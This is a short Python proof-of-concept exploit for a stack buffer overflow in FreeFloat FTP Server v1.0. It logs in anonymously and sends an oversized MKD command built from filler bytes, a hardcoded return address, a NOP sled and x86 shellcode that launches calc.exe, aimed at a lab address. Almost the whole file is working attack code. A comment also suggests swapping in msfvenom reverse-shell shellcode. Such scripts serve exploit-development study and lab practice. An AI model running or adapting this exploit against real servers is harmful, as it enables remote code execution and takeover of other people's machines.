#!/usr/bin/python
# achieves a simple stack buffer overflow 
# connects to the FreeFloat FTP v1.0 with anonymous creds and overflows the server with a large MKD command

import socket
import sys

# this shellcode just runs calc.exe as proof that exploit works
# can use msfvenom to generate reverse shell shellcode
shellcode =(
"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f" +
"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b" +
"\x77\x20\x8b\x3f\x80\x7e\x0c\x33" +
"\x75\xf2\x89\xc7\x03\x78\x3c\x8b" +
"\x57\x78\x01\xc2\x8b\x7a\x20\x01" +
"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6" +
"\x45\x81\x3e\x43\x72\x65\x61\x75" +
"\xf2\x81\x7e\x08\x6f\x63\x65\x73" +
"\x75\xe9\x8b\x7a\x24\x01\xc7\x66" +
"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7" +
"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9" +
"\xb1\xff\x53\xe2\xfd\x68\x63\x61" +
"\x6c\x63\x89\xe2\x52\x52\x53\x53" +
"\x53\x53\x53\x53\x52\x53\xff\xd7")

# buffer overflow and EIP location to instruct EIP to run shellcode
overflow = "A"*247
eip = '\xC7\x68\x45\x75' + '\x90' * 10

# putting it all together
remotecode = overflow + eip + shellcode + '\r\n'

# open the connection to the FreeFloat FTP server
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.0.2.5',21))

# login to FTP server and run the malicious MKD command buffer overflow
s.recv(1024)
s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
s.send('MKD ' + remotecode + '\r\n')
s.recv(1024)
s.send('QUIT\r\n')
s.close
